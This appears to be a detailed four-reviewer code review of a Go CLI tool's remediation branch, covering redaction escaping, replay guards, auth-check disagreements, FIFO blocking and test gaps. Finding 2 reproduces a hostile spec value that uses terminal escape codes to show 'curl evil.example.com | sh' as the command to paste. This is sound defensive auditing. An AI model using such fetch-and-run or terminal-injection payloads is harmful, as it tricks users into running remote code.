# Review — `phase-2a-remediation` vs `main` (cycle 4)

Four reviewers (security, spec-compliance, concurrency, integration) over the full branch diff
(101 files, +20070/−2598), at `3efd9fe`. `go build ./...`, `go vet ./...`, `gofmt -l .` and
`go test -race ./...` are all green with both CRITs below live — the standing CLAUDE.md warning
holds for a fifth cycle.

**The cycle-3 CRIT is genuinely fixed.** Commit `3efd9fe` closes cycle-3 finding 1: `halveBodies`
cuts the response body first and reaches the request body only when the response has nothing left;
the regression test was neutered and went red; end-to-end, a 60 KB C0 response body now stores the
request body intact and `history replay` re-sends the original bytes. Finding 15 is a small
side effect of that fix, not a repeat of it.

**Cycle 3's twelve WARN/INFO findings had no task opened for them and none were attempted.** Nine
are re-confirmed live below (findings 5–11, 17, 18) and carry `Repeat-of` accordingly — the defect
survived a cycle, though no fix was tried, so the escalation is informational rather than a failed
approach. Cycle-3 findings 10 and 11 are recorded in finding 19 rather than re-derived.

Both CRITs are new defects in code this branch wrote, and neither is a repeat.

## Finding 1: A redacted body is stored HTML-escaped, so the replay guard never fires and `history replay` silently re-sends the marker
- **Reviewer:** integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/secret/response.go:119
- **Description:** `Replayable.body` (`internal/corpus/replay.go:180`) refuses a stored request body
  carrying `redactionMark` (`"<redacted"`, `replay.go:19`), and its comment states exactly why:
  *"the API sees a login attempt whose password is the literal text `<redacted>`, and the caller
  sees a 401 with no explanation."* The guard is dead code. `ResponseRedactor.Body` re-encodes the
  redacted document with `json.Marshal`, which HTML-escapes `<` and `>`, so the bytes the store
  actually holds are `\u003credacted\u003e` and `strings.Contains(data, "<redacted")` is false
  against them. Confirmed directly:

  ```
  marshal: {"refresh_token":"\u003credacted\u003e"}
  guard Contains("<redacted"): false
  ```

  Wire-proven independently by the integration reviewer and again by this reviewer against a local
  server, with no configuration at all — the built-in `refresh_token` path:

  ```
  $ talaria call spec.yaml createPet --allow-mutations \
      --body '{"refresh_token":"LIVE-REFRESH-TOKEN"}' --output json          exit=0
    request.body = {"refresh_token":"\u003credacted\u003e"}
    stored line  = "data":"{\"refresh_token\":\"\\u003credacted\\u003e\"}"
  $ talaria history replay <id> --allow-mutations --output json              exit=0
    stderr: (empty)
  $ cat wire.log      # what the server received
    {"refresh_token":"LIVE-REFRESH-TOKEN"}     ← the call
    {"refresh_token":"\u003credacted\u003e"}          ← the replay
  ```

  `history replay` exited 0 having sent a body the original call did not, with nothing on any
  channel. That breaks README.md:478 verbatim — *"Fields that could not be reproduced are reported
  on stderr rather than silently omitted"* — and under `--allow-mutations` it writes the literal
  string `\u003credacted\u003e` into whatever the API persists. It is the same class as the `Truncated`
  refusal twelve lines above it, on the one field where the guard was written and does not run.

  Second surface, same root cause: three spellings of one marker. `call --output json` prints
  `<redacted>` (the body is embedded as raw JSON), `history show --output json` prints
  `\u003credacted\u003e` (it is a string field), and `history show --output pretty` prints
  `\\u003credacted\\u003e` (`escapeCell` doubles the backslash). An agent grepping stdout for
  `<redacted>` finds it on one surface and not the other two.

  The test that "proves" the guard (`internal/corpus/replay_test.go:244`) hand-builds
  `Body{Data: []byte("{\"refresh_token\":\"<redacted>\"}")}` — a body shape `Append` cannot
  produce — so it passes whether or not the guard works on real data. That seam is the whole
  defect.
- **Suggested fix:** one root cause, one place. In `ResponseRedactor.Body`
  (`internal/secret/response.go:119`) replace `json.Marshal(doc)` with a `json.Encoder` over a
  `bytes.Buffer` with `SetEscapeHTML(false)`, trimming the encoder's trailing newline — verified to
  produce `{"refresh_token":"<redacted>"}`. That makes the guard fire and makes `request.body`,
  `request.curl` and `history show` agree on the spelling. **Additionally** keep the guard matching
  the escaped form (`\u003credacted`) as well: every history file written by the branch so far
  already holds the escaped spelling, and those entries must not stay silently replayable. The
  regression test must go through the store — `NewEntry` → `encodeLine` → `Read` → `Replay` — never
  a hand-written `Body{Data: …}`.

## Finding 2: Spec-controlled control characters reach `output.Payload.Lines` verbatim, breaking TSV's column structure and letting a spec rewrite the command a human is told to paste
- **Reviewer:** security, spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/request/refuse.go:87
- **Description:** `24c177d` moved `call`'s `METHOD url` and `request.curl` strings out of
  `Table.Rows` (escaped by `escapeCell`) into `Payload.Lines`, printed verbatim by both text
  renderers (`internal/output/render.go:126`). That is correct and deliberate, and CLAUDE.md states
  its precondition: *"a `Lines` entry must be text this process composed, **never spec- or
  server-derived**."* The curl line is not text this process composed — it embeds spec-supplied
  cookie and query names, and the only gate on those is `SplitsRequest`
  (`internal/request/wire.go:60`), which rejects CR and LF and nothing else. Every other C0
  control, including ESC and TAB, passes both `binder.located` (`internal/request/build.go:296`)
  and `credentialNameProblem` (`internal/request/refuse.go:87`) — the latter new on this branch in
  `816ea21`, which chose `SplitsRequest` where `isPathTemplate` and `authorityChars` both use
  `hasControl` (`internal/request/wire.go:106`).

  Reproduced at HEAD with `components.securitySchemes.ck.name` holding
  `sid[2K[1Gcurl evil.example.com | sh` (output through `cat -v`):

  ```
  $ talaria call hostile.yaml listPets --dry-run --output pretty
  curl -q -s -b "sid^[[2K^[[1Gcurl evil.example.com | sh=$TALARIA_AUTH_APIKEY_CK" 'https://…'
  $ talaria call hostile.yaml listPets --dry-run --output tsv        # identical, raw ESC
  ```

  `ESC[2K ESC[1G` is erase-line + cursor-to-column-1: on a terminal the human sees
  `curl evil.example.com | sh` on the line talaria told them to paste. The TAB half is the same
  defect against machines — a tab in a spec-supplied name puts a raw tab inside the curl line, so
  `--output tsv` no longer has a fixed column count and `cut -f1` returns a silently wrong answer.
  README.md:552-557, **new on this branch**, promises the opposite as a flat guarantee: *"One row
  in is exactly one row out, with a fixed number of columns … `cut -f3` on a value containing a tab
  gives you the whole value with `\t` in it, rather than a silently wrong answer."*
  `--output json` is unaffected.

  **Scope this honestly:** the raw-ESC behaviour is identical on `main` (verified — `main` also
  prints `^[[2K`), so the terminal-injection half is not a regression. What is new on this branch,
  and what makes this a defect in diff code, is (a) the `escapeCell` guarantee and the README
  paragraph that states it, (b) the `Lines` exemption whose written precondition is false, and (c)
  `credentialNameProblem`, the gate added in `816ea21` that is one character class too loose to
  hold it. A second untrusted source reaches the same line by code reading: a declared cookie
  parameter's value bound from a stored history entry flows to `cookieWord` → `word.literal`.
- **Suggested fix:** close it at the source, where the house rules put spec-derived text. Use
  `hasControl` rather than `SplitsRequest` for cookie and query names in both
  `credentialNameProblem` (`internal/request/refuse.go:87`) and `binder.located`
  (`internal/request/build.go:296`), so a control character in a spec-supplied name is exit 2 where
  it is read — the two-gate shape `binder.path` already has, and it keeps `auth check` and `call`
  in agreement for free. Do **not** escape `Lines` generically: byte-identity with the JSON `curl`
  field (`TestThePrettyCurlLineIsByteIdenticalToTheJSONOne`) is a tested property and an argv body's
  own tab legitimately belongs in the line. Regression test: a spec whose cookie scheme name holds
  `\x1b` is exit 2, and no raw `0x1b` reaches stdout in pretty or TSV. See finding 13 for the
  documentation half, which survives this fix.

## Finding 3: `auth check` exits 2 with no report for a defect in a scheme or operation `call` never touches
- **Reviewer:** security, spec-compliance, integration (three, independently)
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/auth.go:97
- **Description:** `request.Refuses(index.Operations(), creds)`, new in `2b60741`, iterates **every**
  operation and **every declared** scheme. `call` gates only the operation being called and only
  the credentials that operation requires. So `auth check` is now strictly stricter than `call` —
  the reverse of the direction DESIGN.md forbids, but still a disagreement, and it destroys the
  report that is `auth check`'s entire job. Verified at HEAD with a declared-but-unused `apiKey`
  scheme:

  ```
  $ talaria auth check unused.yaml --output json
  {"error":{"code":2,"message":"this spec cannot be called: scheme \"legacy\" sends its credential
   in header \"X-Legacy Key\", which is not a valid HTTP header name"}}      exit=2
  $ talaria call unused.yaml listPets --dry-run --output json                 exit=0
  ```

  Same shape for a `paths:` key: one bad operation makes `auth check` exit 2 for a spec whose other
  operations `call` and `list` handle fine. DESIGN.md:356 states the class as *"A spec **`call`
  refuses** for its own strings is exit 2 from `auth check` too"* — but `call` does not refuse these
  specs. AGENT.md:181 turns that premise into an instruction the agent will follow and be wrong
  about: *"Report it and stop; exporting a variable and retrying cannot help."* The agent abandons a
  spec it could have called, and sees no report of which credentials are present.

  The behaviour may be defended — `Refuses`'s own comment says *"auth check answers about the
  spec"* — but then the three shipped documents have to say "any operation, any declared scheme"
  rather than "a spec `call` refuses".
- **Suggested fix:** either (a) narrow the gate to what a call could reach — the operations
  `index.Operations()` returns intersected with the credentials `config.Resolve` would produce — or
  (b) keep the document-wide sweep and render the report *before* returning the error, so the exit
  code says "this spec is broken" without also destroying the credential diagnosis. Whichever,
  restate DESIGN.md:356 and AGENT.md:178 in the same commit. Add a row to
  `TestAuthCheckAndCallAgreeOnUnsupportedSchemes` for "one broken operation, one sound one" — the
  matrix currently holds only whole-spec defects, which is why this passed.

## Finding 4: `auth check` reports `withheld: true` for a spec server `call` refuses outright, with a documented remedy that cannot work
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/auth.go:126
- **Description:** `binder.baseURL` refuses a `servers[].url` that is not an absolute http(s) URL —
  a third document defect `Build` exits 2 on, and one `request.Refuses` does not gate.
  `destinationWithholds` swallows it: `offSet` (`internal/request/server.go:81`) only asks
  `Hosts.Allows(dest)`, so an unusable server reads as "off the set". Verified at HEAD against a
  spec whose only server is `ftp://evil.example.com/v1`:

  ```
  $ talaria auth check badserver.yaml --output json
  {"schemes":[{"scheme":"b","source":"env:TALARIA_AUTH_BEARER","present":true,"withheld":true}]}  exit=0
  $ talaria call badserver.yaml listPets --dry-run --output json
  {"error":{"code":2,"message":"cannot build a request for listPets: base URL
   \"ftp://evil.example.com/v1\" from the spec's servers[0].url is not an absolute http(s) URL"}}  exit=2
  ```

  README.md:318 gives `withheld` a remedy — *"`--allow-host` is the answer when the host is one you
  meant"* — and following it changes nothing: `auth check --allow-host evil.example.com` still says
  withheld, `call --allow-host evil.example.com` still exits 2. This is the direction DESIGN.md:353
  forbids absolutely (*"`auth check` never reports a scheme satisfied when the call would refuse
  it"*) and it is word for word the symptom the branch's own new bullet was written to close, on a
  different string: *"the latter reporting `withheld: true`, which reads as 'point it somewhere
  else' for a spec that is simply broken."*

  A third cell in the same class, weaker: a spec-declared `in: header` parameter whose name is not
  a field name (`binder.located`, `internal/request/build.go:338`) is exit 2 from `call` and exit 0
  from `auth check`.
- **Suggested fix:** have `destinationWithholds` resolve the destination through the reporting path
  rather than bare `Destination`, so a base URL `Build` cannot use becomes an error `auth check`
  returns before the report, not a `withheld` verdict. Add a row to
  `TestRefusesAgreesWithBuildOnADocumentDefect` for a non-http spec server. Note that findings 3
  and 4 are the same defect from two sides — the agreement is asserted absolutely (DESIGN.md:353)
  and implemented as an enumeration (`internal/request/refuse.go:32`); a fix that only adds a
  fourth gate leaves the next string uncovered.

## Finding 5: `auth check` reports a malformed `TALARIA_AUTH_BASIC` as satisfied where `call` exits 5
- **Reviewer:** spec-compliance, security
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 3 (re-confirmed live; no fix attempted, no task opened)
- **File:** internal/curl/firewall.go:62
- **Description:** Re-verified unchanged at HEAD:

  ```
  $ TALARIA_AUTH_BASIC=nopassword talaria auth check basic.yaml --output json
  {"schemes":[{"scheme":"ba","source":"env:TALARIA_AUTH_BASIC","present":true}]}   exit=0
  $ TALARIA_AUTH_BASIC=nopassword talaria call basic.yaml listPets --output json
  {"error":{"code":5,"message":"$TALARIA_AUTH_BASIC must be user:password; …"}}    exit=5
  ```

  `basicPair` is new on this branch (task 16); `auth check`'s verdict is `cred.Present()`
  (`cmd/talaria/auth.go:147`), which never sees the shape. Same contract as findings 3 and 4
  (DESIGN.md:353), plus CLAUDE.md's *"the verdict lives in `internal/config` … Never re-derive 'can
  this spec be called' in the command layer"* — a second verdict lives in `internal/curl`.
  `TestAuthCheckAndCallAgreeOnUnsupportedSchemes` cannot catch it: it drives `call --dry-run`,
  which builds no config document.
- **Suggested fix:** move the shape test into `internal/config` so both commands read one verdict —
  a `Credential.Satisfied()` applying the `user:password` rule for `KindBasic` — and add a
  non-`--dry-run` row to the matrix in `cmd/talaria/auth_test.go`. `SecretRef.Present` already reads
  the value without printing it, so this does not breach *"never prints values"*; AGENT.md:141's
  looser *"`present` is a lookup; the value is never read"* needs the same-commit amendment.

## Finding 6: An unreadable history store is exit 1 — the code AGENT.md tells the agent to retry — and `44c0264` added a third instance rather than classifying it
- **Reviewer:** spec-compliance, concurrency, integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 5 (re-confirmed live and worsened; no fix attempted)
- **File:** internal/corpus/file.go:285
- **Description:** Cycle 3 reported the bare `fmt.Errorf` at `readStore`'s size refusal
  (`file.go:312`) falling through `clierr.From` to `CodeRequestFailed`. Not fixed — and commit
  `44c0264` (task 37) added a *fourth* refusal in the same unclassified shape rather than
  classifying it. Both verified at HEAD:

  ```
  $ talaria history --output json          # 70 MB store
  {"error":{"code":1,"message":"the history file at …/history.jsonl is larger than the 67108864
   bytes talaria will read; move it aside"}}                                             exit=1
  $ talaria history --output json          # store is a FIFO
  {"error":{"code":1,"message":"the history file at …/history.jsonl is not a regular file;
   move it aside"}}                                                                      exit=1
  ```

  `talaria history` makes no request. README.md:573 defines exit 1 as *"The request could not be
  completed (network, curl failure)"* and AGENT.md:252 turns it into *"check the host and
  `--base-url`; retrying once is reasonable"* — advice that can never help for a condition whose fix
  is in the message. It is inconsistent inside `internal/corpus` itself: an unreadable stored
  *entry* is already `clierr.Usage` → exit 2 (`internal/corpus/entry.go:169,176`); only the
  unreadable *store* falls through.
- **Suggested fix:** wrap all four refusals — `file.go:285` (non-regular), `file.go:312`
  (over-bound), `file.go:243` (`tail`'s), and `tail`'s own `openStore` path — in `clierr.Usage`,
  keeping the differing wording CLAUDE.md requires ("move it aside" is wrong advice for a
  permission denial). One line each; the messages are already right.

## Finding 7: `Entry.Replay` ignores `HeadersTruncated`, so a capped entry replays into a different request with nothing on any channel
- **Reviewer:** integration, spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 2 (re-confirmed live; no fix attempted)
- **File:** internal/corpus/replay.go:84
- **Description:** `grep -c HeadersTruncated internal/corpus/replay.go` is `0` at HEAD.
  `out.headers(declared, e.Request.Headers)` binds the capped map, nothing lands in
  `Replayable.Dropped`, `warnUnreplayable` never fires. Re-verified:

  ```
  $ talaria call spec.yaml listPets --header "X-Big=<9000 bytes>" --header "Z-Small=keepme"
    exit=0;  headers_truncated: true;  kept headers: ["Z-Small"]
  $ talaria history replay <id> --output json
    exit=0;  sent headers: {"Z-Small":"keepme"};  stderr: (empty)
  ```

  `history show --output pretty` *does* print `<headers truncated: the entry kept what fit>`, so the
  entry knows and the replay does not. This breaks README.md:478 (*"Fields that could not be
  reproduced are reported on stderr rather than silently omitted"*) and mechanically draws the
  conclusion AGENT.md:298 forbids. It is the identical argument the body rule makes twelve lines
  below at `replay.go:168`, applied to one capped field and not the other. `maxHeaderBytes` is 8 KiB
  over the whole map, so ordinary `--header` use reaches it; a dropped idempotency or tenant header
  on an `--allow-mutations` replay is the bad case.
- **Suggested fix:** treat `e.Request.HeadersTruncated` the way `body` treats `Body.Truncated`.
  Refusal (`clierr.Usage`, naming `maxHeaderBytes`) is the consistent choice given the body rule's
  own reasoning; if a partial replay is judged more useful, append to `Replayable.Dropped` so
  `warnUnreplayable` fires. Whichever, say which in README's replay bullet list, which enumerates
  every other refusal. Regression test: an entry with `HeadersTruncated: true` must produce either
  an error or a non-empty `Dropped`, never both empty.

## Finding 8: `history show` prints a truncated body as if it were whole
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 7 (re-confirmed live; no fix attempted)
- **File:** cmd/talaria/history.go:279
- **Description:** `bodyLine` returns `body.Data` verbatim for a non-base64 body and never consults
  `Body.Truncated`, while the header path above it prints `<headers truncated: the entry kept what
  fit>`. Re-verified with a 200 KB body file: the stored request body is 65536 bytes with
  `truncated: true`, and `history show --output pretty` and `--output tsv` both print the prefix
  with no marker. Only `--output json` carries `"truncated": true`, so the two default surfaces
  state a body the call never sent. Now compounded by finding 15: an emptied response body renders
  as a blank row, which reads as "the server sent nothing".
- **Suggested fix:** append a marker in `bodyLine` when `body.Truncated` — `… (N bytes kept,
  truncated)`, or the `<…>` form the header row already uses — so pretty and TSV say what JSON says.

## Finding 9: The truncated-body replay refusal names `MaxBody` rather than where the cut actually happened
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 8 (re-confirmed live; no fix attempted)
- **File:** internal/corpus/replay.go:168
- **Description:** The message is hard-coded to `MaxBody`. When `halveBodies` did the cutting the
  number is wrong and misleadingly so. Re-verified on the `halveBodies` path — 65,000 `0x01` bytes
  as the request body, tiny response — 32,500 bytes kept, reported as:

  ```
  {"error":{"code":2,"message":"the recorded request body was truncated at 65536 bytes, so
   replaying it would send something the original did not"}}
  ```

  An operator reads that as "you sent a 64 KB body". Fixing cycle-3 finding 1 made this path rarer,
  not gone.
- **Suggested fix:** report `len(body.Data)` rather than the constant — "was truncated to N bytes".

## Finding 10: `config.(*Profile).ReferencesEnv` is dead code whose comment claims a live security role
- **Reviewer:** security, integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 9 (re-confirmed live; no fix attempted)
- **File:** internal/config/auth.go:467
- **Description:** `grep -rn ReferencesEnv --include='*.go' .` at HEAD returns the definition, its
  comment and `internal/config/auth_test.go` — no production caller. Its one caller on `main` was
  replay's old env-name allowlist, removed by `8cf9d1a` when replay was re-derived from the spec.
  The comment still asserts the removed behaviour: *"It exists for `history replay`, which reads a
  variable's *name* out of a file on disk … The set of names a replay may resolve is the
  TALARIA_AUTH_\* convention plus this."* Both halves are false, and a reader auditing the replay
  trust boundary from `internal/config` is told an allowlist exists that does not — the
  "comment asserting a property no test enforces" class CLAUDE.md forbids, in the package that owns
  the auth verdict.
- **Suggested fix:** delete `ReferencesEnv` and its two tests
  (`TestReferencesEnvAnswersForTheProfilesAuthMap`, `TestReferencesEnvOfNoProfileIsFalse`) — the
  mechanism it guarded was replaced, not relocated. If it is being kept for phase 2b, rewrite the
  comment to say it has no caller and why.

## Finding 11: The spec cache read still blocks in `open(2)`, and the branch now contradicts itself about it
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 4 (re-confirmed live; no fix attempted)
- **File:** internal/spec/source.go:112
- **Description:** Unchanged at HEAD, comment included: *"Deliberately not gated on ctx: reading the
  cache is not a wait, and the answer is already on disk"* over an `os.ReadFile`, which opens
  `O_RDONLY` and blocks in `open(2)` on a FIFO before any read. Re-verified in-process with a FIFO
  planted at `cachePath` **and an already-cancelled context**: `Load` blocked for the full 5s
  budget. The second way out works — a second SIGINT kills the process — but everything that sends
  *one* signal (`timeout`, systemd's `TimeoutStopSec`, CI cancellation, a supervisor's `kill`) never
  gets the process back.

  What is new since cycle 3 is that the fix now exists in-tree one package over: `44c0264` wrote
  `openStore` (`internal/corpus/file.go:272`) — `O_RDONLY|syscall.O_NONBLOCK`, `Stat`, refuse
  non-regular — for the identical defect, and CLAUDE.md's new paragraph calls that class a
  process-level failure where §3.1 allows only an entry-level one. The branch now asserts both that
  this shape must be refused (corpus) and that reading the cache "is not a wait" (spec). One of the
  two sentences is false.
- **Suggested fix:** the `openStore` shape, with a cache miss instead of an error —
  `os.OpenFile(cachePath, os.O_RDONLY|syscall.O_NONBLOCK, 0)`, `Stat` the descriptor, fall through
  to the fetch on anything `Mode().IsRegular()` rejects, read under
  `io.LimitReader(f, maxSpecBytes+1)`, which closes task 20's unbounded-cache-read half in the same
  pass. Test the corpus shape: FIFO at the cache path, `Load` driven from a goroutine against a
  timer. If it stays deferred to task 20, narrow the comment at `source.go:107-109` and CLAUDE.md's
  matching sentence to what is enforced — the exception is safe for a regular file, not for an
  arbitrary path.

## Finding 12: `abandonWith`'s deadline is not wired through `waitForLock`, so the whole suite is green against the unbounded pre-fix code
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/lock_unix.go:130
- **Description:** `4440b68` added `abandonWith(f, taken, timeout)` as the deadline seam *"exactly
  as `lockWith` is to `lock`"*. But `waitForLock`'s two give-up arms call the defaulted `abandon`
  (`lock_unix.go:130` and `:133`), so `lockWith`'s `timeout` parameter stops at `waitForLock` and a
  test driving it with 300ms still gets a 60s abandonment. Both new tests therefore reach
  `abandonWith` through the test-local `queued()` helper (`internal/corpus/lock_test.go:174`), which
  re-implements `waitForLock`'s open + `Fd()` + goroutine by hand. They test `abandonWith`; nothing
  tests the wiring.

  Proven by neutering — `abandon`'s body replaced with the exact pre-`4440b68` unbounded form
  (`<-taken; f.Close()`):

  ```
  ok  github.com/Teeeep/talaria/internal/corpus  27.159s
  ok  github.com/Teeeep/talaria/cmd/talaria       1.770s
  ```

  Green against the defect the commit exists to fix. The shipped code *is* correct — a scratch test
  counting `/proc/self/fd` links confirmed the descriptor is dropped at exactly `abandonTimeout`
  through the production path — so this is a missing guard, not a live bug. It is recorded as WARN
  because CLAUDE.md's own rule is the one being broken: *"Neuter the implementation and watch the
  test go red before you believe it."*
- **Suggested fix:** thread the deadline — `waitForLock(ctx, f, timeout)` calls
  `abandonWith(f, taken, timeout)`. `lockTimeout` and `abandonTimeout` are both `time.Minute` today,
  so this is behaviour-preserving in production and makes the second wait observable in 300ms. Then
  add, beside the two existing cases: hold the lock and never release, call `lockWith` with the test
  timeout, assert the lock descriptor count is back to baseline — driven through `waitForLock`, not
  `queued`.

## Finding 13: The `Lines` exemption is in CLAUDE.md and in neither README.md nor AGENT.md, and README states the opposite
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** README.md:552
- **Description:** `24c177d` (task 36) made `call` print its `METHOD url` and `request.curl` as
  verbatim lines. The reasoning is written into CLAUDE.md and is right. Nothing in README or
  AGENT.md records the exemption, and README.md:552-557 — **new on this branch, in the same
  remediation that added `escapeCell`** — states the opposite as a flat promise: *"One row in is
  exactly one row out, with a fixed number of columns … `cut -f3` on a value containing a tab gives
  you the whole value with `\t` in it, rather than a silently wrong answer."* Verified with an argv
  body containing a real tab and a real newline:

  ```
  $ talaria call pets.yaml createPet --allow-mutations --body "$(printf '{"a":"x\ty"}')" \
      --output tsv | cut -f1
  POST http://127.0.0.1:8791/pets
  curl -q -s -X POST … --data-raw '{"a":"x          ← truncated at the embedded tab
  ```

  This half survives finding 2's fix: an argv body's own tab legitimately belongs in the curl line,
  because byte-identity with the JSON `curl` field is the point of `Lines`. It is the documentation
  that is wrong, and it is the house rule *"A field an agent branches on is named in all three
  shipped documents"* applied to an output-shape change.
- **Suggested fix:** one sentence each in README's Output section and AGENT.md's Output section:
  `call` prints the request line and the curl command as verbatim lines before the rows, because a
  command whose backslashes are doubled and whose tabs are folded is no longer the command that ran;
  the escaping guarantee covers the tabular rows. Only `cmd/talaria/call.go:476` sets `Lines`, so
  the scope of the exemption is exactly stateable.

## Finding 14: `write()` is still a blocking `O_WRONLY` open of the store, inside the append lock
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/file.go:68
- **Description:** `44c0264` gated the two *readers* behind `openStore`. The third open was not:
  `os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, fileMode)`. `open(fifo, O_WRONLY)` with no
  reader blocks exactly as `O_RDONLY` does — confirmed directly with a 3s budget. It is unreachable
  today only because `Append`'s critical section runs `trim` → `tail` → `openStore` first, which
  refuses (also confirmed end to end). The behaviour is correct; what is INFO-worthy is that this is
  an **ordering dependency nothing states or tests**, in a critical section cycle-3 finding 10
  proposes reordering. A reorder that let `write` run before a read of the path re-opens the class
  inside the lock, where the wait becomes every other talaria's. There is also a narrow same-user
  TOCTOU window: the readers return `fs.ErrNotExist` for a store that does not exist yet, and a FIFO
  planted between `storedIDs` and `write` wedges the process while it holds the append lock.
- **Suggested fix:** give `write` the same gate — `O_APPEND|O_CREATE|O_WRONLY|syscall.O_NONBLOCK`,
  then `f.Stat()` and refuse non-regular with the same sentence, before the `Chmod`. Add `"write"`
  as a third entry to `TestAStoreThatIsAFIFOIsRefusedRatherThanWaitedOn`'s `readers` map. Failing
  that, state the dependency in `Append`'s doc comment — it is currently an unenforced invariant of
  the kind the house rules forbid.

## Finding 15: `halveBodies` empties a tiny response body over passes that cannot help, before cutting the request body anyway
- **Reviewer:** integration
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/file.go:382
- **Description:** New side effect of `3efd9fe`'s (correct) reordering: the response-first rule is
  unconditional rather than size-aware, so an 11-byte response body is halved to empty over four
  passes before the oversized *request* body is cut. Observed with a 65,000-byte request body:
  `response.body = {"content_type":"application/json","data":"","truncated":true}`. Combined with
  finding 8, `history show --output pretty` then shows an empty row for the response body, which
  reads as "the server returned nothing".
- **Suggested fix:** skip the response body when halving it cannot close the overage
  (`len(e.Response.Body.Data)/2 < overage`), or fall through to the request body once the response
  contributes less than the shortfall. `halveBodies` still returns true as long as either step cut
  something, so `encodeLine`'s loop and its refusal are unchanged.

## Finding 16: `badPathTemplate`'s message misnames the fault it is now shown for most often
- **Reviewer:** security
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/request/refuse.go:59
- **Description:** The message says *"the path `/pets/{pet id}`, which is not an absolute path"*. It
  is absolute; the fault is the space. Tolerable while only `binder.path` printed it; `2b60741` made
  it the message `auth check` returns for any operation in the spec (finding 3), which is now the
  most likely way a user meets it.
- **Suggested fix:** split the two conditions (`strings.HasPrefix(s, "/")` vs `hasControl(s)`) so
  the message names the one that failed.

## Finding 17: Three tests order themselves with a sleep
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 12 (re-confirmed live and extended; no fix attempted)
- **File:** internal/corpus/lock_test.go:263
- **Description:** Cycle 3 reported `internal/curl/exec_test.go:428`; it is unchanged, and two more
  on this branch share the shape — `lock_test.go:263` (`go func(){ time.Sleep(50ms); cancel() }()`
  in `TestAppendStopsWaitingWhenTheContextIsCancelled`) and `lock_test.go:130`
  (`go func(){ time.Sleep(50ms); release() }()` in `TestTheLockWaitsOutAHolderThatReleases`, whose
  assertion `spent < 50ms → fail` is a statement about the scheduler). All three are new on the
  branch; `git grep time.Sleep main -- '*_test.go'` returns only `exec_test.go:74`, the `fakeCurl`
  script's own sleep. None flakes today. Recorded again because the count went from one to three
  while CLAUDE.md's ban stands, and `8dc6738` removed the equivalent sleep from `root_test.go` on
  this same branch. `cmd/talaria/root_test.go:46` and `internal/request/body_test.go:188` are *not*
  in this set — the first is the documented "going deaf is its subject" child, the second is a rate
  limiter inside a fake reader.
- **Suggested fix:** the `awaitLine` / `awaitStdinDrain` shape already in `root_test.go` — wait on
  something the code under test observably did.

## Finding 18: Stale number in a test comment — the lock deadline is a minute, not five seconds
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** cycle 3 finding 13 (re-confirmed live; no fix attempted)
- **File:** cmd/talaria/record_test.go:46
- **Description:** *"// Cancelled, so the bounded wait ends at once rather than in five seconds."*
  `lockTimeout` is `time.Minute` (`internal/corpus/lock_unix.go:26`), and the reasoning for the
  minute is written out at length there. The number is the point of the sentence.
- **Suggested fix:** say "a minute", or name `lockTimeout` rather than a literal.

## Finding 19: Scope record — carried over, out of scope, and pre-existing (not defects)
- **Reviewer:** all four
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** tasks.json:1
- **Description:** Recorded so cycle 5 does not spend probes re-deriving them.
  - **Cycle-3 findings still live and deliberately not re-derived above:** finding 10 (`Append`
    trims before it encodes, so an entry `encodeLine` refuses can still cost an older one —
    `internal/corpus/store.go:111`) and finding 11 (CLAUDE.md's *"nothing that writes a directive
    may call `resolve`"* is falsified by `resolve`'s only call site,
    `internal/curl/firewall.go:157`). Both unchanged, both still INFO.
  - **Out of scope for this branch:** tasks 18–24 (refactor passes, the spec-cache TTL and
    `--refresh` — which shares finding 11's fix site — one pass over the history file per append,
    the comment/invariant audit, and the end-to-end credential-firewall test), and the
    `corpus → request → config` transitive edge deferred to phase 2b.
  - **Pre-existing on `main`, confirmed again this cycle:** `internal/curl/exec.go:138` (curl
    8.14.1's `--write-out '%{json}'` emits invalid JSON for query strings over ~64 KiB, so a
    successful call surfaces as exit 1) and `internal/curl/render.go:243` (`urlWord` skips
    `url.QueryEscape` for sensitive values, so a credential containing `&`, `=`, `#` or a space
    produces a reproduction that sends a different request). Also pre-existing: the raw-ESC half of
    finding 2 (`main` prints `^[[2K` identically) and the fact that Windows is already unbuildable
    (`isolate`, `lock` undefined), so `syscall.O_NONBLOCK` in `file.go` is not a new portability
    break.
- **Suggested fix:** none — this entry is a scope record, not a defect.

---

## Verified sound, so cycle 5 does not re-derive it

- **Cycle-3 finding 1 (CRIT) is genuinely closed by `3efd9fe`.** `halveBodies`
  (`internal/corpus/file.go:382`) cuts the response body first and reaches the request body only
  when the response has nothing left. Reverting the order makes
  `TestAnOversizedResponseBodyDoesNotCostTheRequestBodyItsReplayability` fail with *"the request
  body was cut to 0 of its 31 bytes"*. Wire-verified end to end: 60 KB of `0x01` in a response body
  → `call` exit 0, request body stored intact with `truncated` absent, and `history replay` exit 0
